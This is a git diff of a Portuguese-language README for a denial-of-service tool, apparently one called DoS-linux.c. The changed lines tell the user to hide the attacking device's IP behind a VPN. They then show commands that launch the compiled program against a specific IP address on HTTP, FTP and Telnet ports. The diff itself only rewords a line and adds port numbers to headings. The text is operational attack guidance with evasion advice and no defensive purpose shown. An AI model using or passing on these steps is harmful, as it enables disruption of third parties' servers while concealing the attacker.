@@ -38,27 +38,28 @@ gcc DoS-linux.c -o DoSS
 
 ### Step 3
 
-- Ligar a VPN ou outro mecanismo que esconda o IP do dispositivo atacante.
+- Se possível ligar uma VPN ou outro mecanismo que
+esconda o IP do dispositivo atacante.
 	
 - Executar o programa compilado no Step 2, passando o IP e a Porta do Alvo para que as o programa faça as REQUESTS.
 
-Exemplos :
+exemplos :
 
-*Direcionando o DoS para um servidor HTTP* :
+*Direcionando o DoS para um servidor HTTP(porta 80)* :
 
 
 ```bash
 ./DoS 65.75.137.94 80
 ```
 
-*Direcionando o DoS para um servidor FTP* :
+*Direcionando o DoS para um servidor FTP(porta 21)* :
 
 
 ```bash
 ./DoS 65.75.137.94 21
 ```
 
-*Direcionando o DoS para um servidor Telnet* :
+*Direcionando o DoS para um servidor Telnet(porta 23)* :
 
 
 ```bash
